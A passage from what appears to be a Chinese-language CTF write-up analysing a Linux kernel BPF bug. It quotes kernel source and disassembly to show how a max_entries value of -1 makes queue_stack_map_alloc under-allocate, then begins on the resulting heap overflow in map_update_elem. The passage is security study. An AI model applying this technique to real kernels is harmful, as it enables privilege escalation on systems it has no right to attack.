    <content type="html"><![CDATA[<p>题目会放在:<a class="link"   href="https://github.com/196082/196082" >https://github.com/196082/196082<i class="fas fa-external-link-alt"></i></a></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>kernel中的bpf模块主要用于用户态定义数据包过滤方法，如常见的抓包工具都基于此实现，并且用户态的Seccomp功能也与此功能相似。</p><h3 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h3><p>该漏洞存在于BPF_MAP_CREATE功能中，并且可以看到处理的函数是map_create。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(bpf, <span class="keyword">int</span>, cmd, <span class="keyword">union</span> bpf_attr __user *, uattr, <span class="keyword">unsigned</span> <span class="keyword">int</span>, size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;&#125;;</span><br><span class="line">  <span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (sysctl_unprivileged_bpf_disabled &amp;&amp; !capable(CAP_SYS_ADMIN))</span><br><span class="line">    <span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">  err = bpf_check_uarg_tail_zero(uattr, <span class="keyword">sizeof</span>(attr), size);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">  size = <span class="keyword">min_t</span>(u32, size, <span class="keyword">sizeof</span>(attr));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* copy attributes from user space, may be less than sizeof(bpf_attr) */</span></span><br><span class="line">  <span class="keyword">if</span> (copy_from_user(&amp;attr, uattr, size) != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">  err = security_bpf(cmd, &amp;attr, size);</span><br><span class="line">  <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">    <span class="keyword">case</span> BPF_MAP_CREATE:</span><br><span class="line">      err = map_create(&amp;attr);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> BPF_MAP_LOOKUP_ELEM:</span><br><span class="line">      err = map_lookup_elem(&amp;attr);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> BPF_MAP_UPDATE_ELEM:</span><br><span class="line">      err = map_update_elem(&amp;attr);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>可以看到下面使用find_and_alloc_map函数创建一个map结构体，并为其分配编号，然后寻找出来生成的map。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">map_create</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> numa_node = bpf_map_attr_numa_node(attr);</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map</span>;</span></span><br><span class="line">  <span class="keyword">int</span> f_flags;</span><br><span class="line">  <span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">  err = CHECK_ATTR(BPF_MAP_CREATE);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  f_flags = bpf_get_file_flag(attr-&gt;map_flags);</span><br><span class="line">  <span class="keyword">if</span> (f_flags &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> f_flags;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (numa_node != NUMA_NO_NODE &amp;&amp;</span><br><span class="line">      ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)numa_node &gt;= nr_node_ids ||</span><br><span class="line">       !node_online(numa_node)))</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* find map type and init map: hashtable vs rbtree vs bloom vs ... */</span></span><br><span class="line">  <span class="built_in">map</span> = find_and_alloc_map(attr);</span><br><span class="line">  <span class="keyword">if</span> (IS_ERR(<span class="built_in">map</span>))</span><br><span class="line">    <span class="keyword">return</span> PTR_ERR(<span class="built_in">map</span>);</span><br><span class="line"></span><br><span class="line">  err = bpf_obj_name_cpy(<span class="built_in">map</span>-&gt;name, attr-&gt;map_name);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">goto</span> free_map_nouncharge;</span><br><span class="line"></span><br><span class="line">  atomic_set(&amp;<span class="built_in">map</span>-&gt;refcnt, <span class="number">1</span>);</span><br><span class="line">  atomic_set(&amp;<span class="built_in">map</span>-&gt;usercnt, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (attr-&gt;btf_key_type_id || attr-&gt;btf_value_type_id) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">btf</span> *<span class="title">btf</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!attr-&gt;btf_key_type_id || !attr-&gt;btf_value_type_id) &#123;</span><br><span class="line">      err = -EINVAL;</span><br><span class="line">      <span class="keyword">goto</span> free_map_nouncharge;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    btf = btf_get_by_fd(attr-&gt;btf_fd);</span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(btf)) &#123;</span><br><span class="line">      err = PTR_ERR(btf);</span><br><span class="line">      <span class="keyword">goto</span> free_map_nouncharge;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    err = map_check_btf(<span class="built_in">map</span>, btf, attr-&gt;btf_key_type_id,</span><br><span class="line">                        attr-&gt;btf_value_type_id);</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      btf_put(btf);</span><br><span class="line">      <span class="keyword">goto</span> free_map_nouncharge;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">map</span>-&gt;btf = btf;</span><br><span class="line">    <span class="built_in">map</span>-&gt;btf_key_type_id = attr-&gt;btf_key_type_id;</span><br><span class="line">    <span class="built_in">map</span>-&gt;btf_value_type_id = attr-&gt;btf_value_type_id;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  err = security_bpf_map_alloc(<span class="built_in">map</span>);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">goto</span> free_map_nouncharge;</span><br><span class="line"></span><br><span class="line">  err = bpf_map_init_memlock(<span class="built_in">map</span>);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">goto</span> free_map_sec;</span><br><span class="line"></span><br><span class="line">  err = bpf_map_alloc_id(<span class="built_in">map</span>);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">goto</span> free_map;</span><br><span class="line"></span><br><span class="line">  err = bpf_map_new_fd(<span class="built_in">map</span>, f_flags);</span><br><span class="line">  <span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">/* failed to allocate fd.</span></span><br><span class="line"><span class="comment"> * bpf_map_put() is needed because the above</span></span><br><span class="line"><span class="comment"> * bpf_map_alloc_id() has published the map</span></span><br><span class="line"><span class="comment"> * to the userspace and the userspace may</span></span><br><span class="line"><span class="comment"> * have refcnt-ed it through BPF_MAP_GET_FD_BY_ID.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    bpf_map_put(<span class="built_in">map</span>);</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  free_map:</span><br><span class="line">  bpf_map_release_memlock(<span class="built_in">map</span>);</span><br><span class="line">  free_map_sec:</span><br><span class="line">  security_bpf_map_free(<span class="built_in">map</span>);</span><br><span class="line">  free_map_nouncharge:</span><br><span class="line">  btf_put(<span class="built_in">map</span>-&gt;btf);</span><br><span class="line">  <span class="built_in">map</span>-&gt;ops-&gt;map_free(<span class="built_in">map</span>);</span><br><span class="line">  <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面分析find_and_alloc_map函数，那么首先还是先看一下传参结构体的定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span> <span class="comment">/* anonymous struct used by BPF_MAP_CREATE command */</span></span><br><span class="line">__u32map_type;<span class="comment">/* one of enum bpf_map_type */</span></span><br><span class="line">__u32key_size;<span class="comment">/* size of key in bytes */</span></span><br><span class="line">__u32value_size;<span class="comment">/* size of value in bytes */</span></span><br><span class="line">__u32max_entries;<span class="comment">/* max number of entries in a map */</span></span><br><span class="line">__u32map_flags;<span class="comment">/* BPF_MAP_CREATE related</span></span><br><span class="line"><span class="comment"> * flags defined above.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">__u32inner_map_fd;<span class="comment">/* fd pointing to the inner map */</span></span><br><span class="line">__u32numa_node;<span class="comment">/* numa node (effective only if</span></span><br><span class="line"><span class="comment"> * BPF_F_NUMA_NODE is set).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">char</span>map_name[BPF_OBJ_NAME_LEN];</span><br><span class="line">__u32map_ifindex;<span class="comment">/* ifindex of netdev to create on */</span></span><br><span class="line">__u32btf_fd;<span class="comment">/* fd pointing to a BTF type data */</span></span><br><span class="line">__u32btf_key_type_id;<span class="comment">/* BTF type_id of the key */</span></span><br><span class="line">__u32btf_value_type_id;<span class="comment">/* BTF type_id of the value */</span></span><br><span class="line">&#125;;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct bpf_map *<span class="title">find_and_alloc_map</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> *<span class="title">ops</span>;</span></span><br><span class="line">u32 type = attr-&gt;map_type;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map</span>;</span></span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (type &gt;= ARRAY_SIZE(bpf_map_types))</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line">type = array_index_nospec(type, ARRAY_SIZE(bpf_map_types));</span><br><span class="line">ops = bpf_map_types[type];</span><br><span class="line"><span class="keyword">if</span> (!ops)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ops-&gt;map_alloc_check) &#123;</span><br><span class="line">err = ops-&gt;map_alloc_check(attr);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (attr-&gt;map_ifindex)</span><br><span class="line">ops = &amp;bpf_map_offload_ops;</span><br><span class="line"><span class="built_in">map</span> = ops-&gt;map_alloc(attr);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(<span class="built_in">map</span>))</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">map</span>;</span><br><span class="line"><span class="built_in">map</span>-&gt;ops = ops;</span><br><span class="line"><span class="built_in">map</span>-&gt;map_type = type;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">map</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里是首先根据type作为索引得到ops，最后再调用ops中的map_alloc函数但是可以注意到的是在数组中存在以下的ops结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> <span class="title">queue_map_ops</span> =</span> &#123;</span><br><span class="line">.map_alloc_check = queue_stack_map_alloc_check,</span><br><span class="line">.map_alloc = queue_stack_map_alloc,</span><br><span class="line">.map_free = queue_stack_map_free,</span><br><span class="line">.map_lookup_elem = queue_stack_map_lookup_elem,</span><br><span class="line">.map_update_elem = queue_stack_map_update_elem,</span><br><span class="line">.map_delete_elem = queue_stack_map_delete_elem,</span><br><span class="line">.map_push_elem = queue_stack_map_push_elem,</span><br><span class="line">.map_pop_elem = queue_map_pop_elem,</span><br><span class="line">.map_peek_elem = queue_map_peek_elem,</span><br><span class="line">.map_get_next_key = queue_stack_map_get_next_key,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里的漏洞也就存在于上述结构体中的<code>queue_stack_map_alloc</code>函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.text:FFFFFFFF8119D17A 44 89 F0                      mov     eax, r14d</span><br><span class="line">.text:FFFFFFFF8119D17D 4C 8B 3C C5 80 83 02 82       mov     r15, ds:qword_FFFFFFFF82028380[rax*8]</span><br><span class="line">  </span><br><span class="line">.rodata:FFFFFFFF82028380 qword_FFFFFFFF82028380   dq 0                    ; DATA XREF: map_create+AD↑r</span><br><span class="line">; ... ...</span><br><span class="line">.rodata:FFFFFFFF82028410                 dq offset unk_FFFFFFFF8210F0A0</span><br><span class="line">.rodata:FFFFFFFF82028418                 dq offset unk_FFFFFFFF82029B00</span><br><span class="line">.rodata:FFFFFFFF82028420                 dq offset unk_FFFFFFFF8202A680</span><br><span class="line">.rodata:FFFFFFFF82028428                 dq offset unk_FFFFFFFF82029B00</span><br><span class="line">.rodata:FFFFFFFF82028430                 dq offset unk_FFFFFFFF82029C40</span><br><span class="line">.rodata:FFFFFFFF82028438                 dq offset off_FFFFFFFF82029BA0</span><br><span class="line">; ... ...</span><br><span class="line">.rodata:FFFFFFFF82029BA0                 dq offset queue_stack_map_alloc_check</span><br><span class="line">.rodata:FFFFFFFF82029BA8                 dq offset queue_stack_map_alloc</span><br><span class="line">.rodata:FFFFFFFF82029BB0                 dq 0</span><br><span class="line">.rodata:FFFFFFFF82029BB8                 dq offset queue_stack_map_free</span><br><span class="line">.rodata:FFFFFFFF82029BC0                 dq offset queue_stack_map_get_next_key</span><br><span class="line">.rodata:FFFFFFFF82029BC8                 dq 0</span><br><span class="line">.rodata:FFFFFFFF82029BD0                 dq offset queue_stack_map_lookup_elem</span><br><span class="line">.rodata:FFFFFFFF82029BD8                 dq offset queue_stack_map_update_elem</span><br><span class="line">.rodata:FFFFFFFF82029BE0                 dq offset queue_stack_map_delete_elem</span><br><span class="line">.rodata:FFFFFFFF82029BE8                 dq offset queue_stack_map_push_elem</span><br><span class="line">.rodata:FFFFFFFF82029BF0                 dq offset stack_map_pop_elem</span><br><span class="line">.rodata:FFFFFFFF82029BF8                 dq offset stack_map_peek_elem</span><br></pre></td></tr></table></figure><p>可以看到只要计算偏移就可以成功修改ops为<code>queue_stack_map_alloc</code>函数，经过计算可得type为:<code>(0xFFFFFFFF82028438 - 0xFFFFFFFF82028380）/8 = 0x17 </code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct bpf_map *<span class="title">queue_stack_map_alloc</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ret, numa_node = bpf_map_attr_numa_node(attr);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_queue_stack</span> *<span class="title">qs</span>;</span></span><br><span class="line">u64 size, queue_size, cost;</span><br><span class="line"></span><br><span class="line">size = (u64) attr-&gt;max_entries + <span class="number">1</span>;</span><br><span class="line">cost = queue_size = <span class="keyword">sizeof</span>(*qs) + size * attr-&gt;value_size;</span><br><span class="line"><span class="keyword">if</span> (cost &gt;= U32_MAX - PAGE_SIZE)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-E2BIG);</span><br><span class="line"></span><br><span class="line">cost = round_up(cost, PAGE_SIZE) &gt;&gt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line">ret = bpf_map_precharge_memlock(cost);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(ret);</span><br><span class="line"></span><br><span class="line">qs = bpf_map_area_alloc(queue_size, numa_node);</span><br><span class="line"><span class="keyword">if</span> (!qs)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(qs, <span class="number">0</span>, <span class="keyword">sizeof</span>(*qs));</span><br><span class="line"></span><br><span class="line">bpf_map_init_from_attr(&amp;qs-&gt;<span class="built_in">map</span>, attr);</span><br><span class="line"></span><br><span class="line">qs-&gt;<span class="built_in">map</span>.pages = cost;</span><br><span class="line">qs-&gt;size = size;</span><br><span class="line"></span><br><span class="line">raw_spin_lock_init(&amp;qs-&gt;lock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> &amp;qs-&gt;<span class="built_in">map</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里的cost其实就是等于<code>sizeof(*qs) + (attr-&gt;value_size) * (attr-&gt;max_entries+1)</code>，并且这里的attr是我们可控的，如果我们控制<code>attr-&gt;max_entries</code>为-1那么这里申请的大小只有<code>sizeof(struct bpf_queue_stack)</code>并且这个size其实是管理堆块的大小，用于存储数据结构，后面的内容为数据存储结构。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bpf_map_init_from_attr</span><span class="params">(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">map</span>-&gt;map_type = attr-&gt;map_type;</span><br><span class="line"><span class="built_in">map</span>-&gt;key_size = attr-&gt;key_size;</span><br><span class="line"><span class="built_in">map</span>-&gt;value_size = attr-&gt;value_size;</span><br><span class="line"><span class="built_in">map</span>-&gt;max_entries = attr-&gt;max_entries;</span><br><span class="line"><span class="built_in">map</span>-&gt;map_flags = attr-&gt;map_flags;</span><br><span class="line"><span class="built_in">map</span>-&gt;numa_node = bpf_map_attr_numa_node(attr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后将用户传进来的attr赋值过去。最后生成id，并将id返回给用户。</p><h3 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h3><p>可以看到在上面的系统调用中存在BPF_MAP_UPDATE_ELEM功能，其实现的函数为：map_update_elem</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">map_update_elem</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> __user *ukey = u64_to_user_ptr(attr-&gt;key);</span><br><span class="line">  <span class="keyword">void</span> __user *uvalue = u64_to_user_ptr(attr-&gt;value);</span><br><span class="line">  <span class="keyword">int</span> ufd = attr-&gt;map_fd;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map</span>;</span></span><br><span class="line">  <span class="keyword">void</span> *key, *value;</span><br><span class="line">  u32 value_size;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>;</span></span><br><span class="line">  <span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (CHECK_ATTR(BPF_MAP_UPDATE_ELEM))</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  f = fdget(ufd);</span><br><span class="line">  <span class="built_in">map</span> = __bpf_map_get(f);</span><br><span class="line">  <span class="keyword">if</span> (IS_ERR(<span class="built_in">map</span>))</span><br><span class="line">    <span class="keyword">return</span> PTR_ERR(<span class="built_in">map</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!(f.file-&gt;f_mode &amp; FMODE_CAN_WRITE)) &#123;</span><br><span class="line">    err = -EPERM;</span><br><span class="line">    <span class="keyword">goto</span> err_put;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  key = __bpf_copy_key(ukey, <span class="built_in">map</span>-&gt;key_size);</span><br><span class="line">  <span class="keyword">if</span> (IS_ERR(key)) &#123;</span><br><span class="line">    err = PTR_ERR(key);</span><br><span class="line">    <span class="keyword">goto</span> err_put;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_HASH ||</span><br><span class="line">      <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_LRU_PERCPU_HASH ||</span><br><span class="line">      <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_ARRAY ||</span><br><span class="line">      <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE)</span><br><span class="line">    value_size = round_up(<span class="built_in">map</span>-&gt;value_size, <span class="number">8</span>) * num_possible_cpus();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    value_size = <span class="built_in">map</span>-&gt;value_size;</span><br><span class="line"></span><br><span class="line">  err = -ENOMEM;</span><br><span class="line">  value = kmalloc(value_size, GFP_USER | __GFP_NOWARN);</span><br><span class="line">  <span class="keyword">if</span> (!value)</span><br><span class="line">    <span class="keyword">goto</span> free_key;</span><br><span class="line"></span><br><span class="line">  err = -EFAULT;</span><br><span class="line">  <span class="keyword">if</span> (copy_from_user(value, uvalue, value_size) != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> free_value;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Need to create a kthread, thus must support schedule */</span></span><br><span class="line">  <span 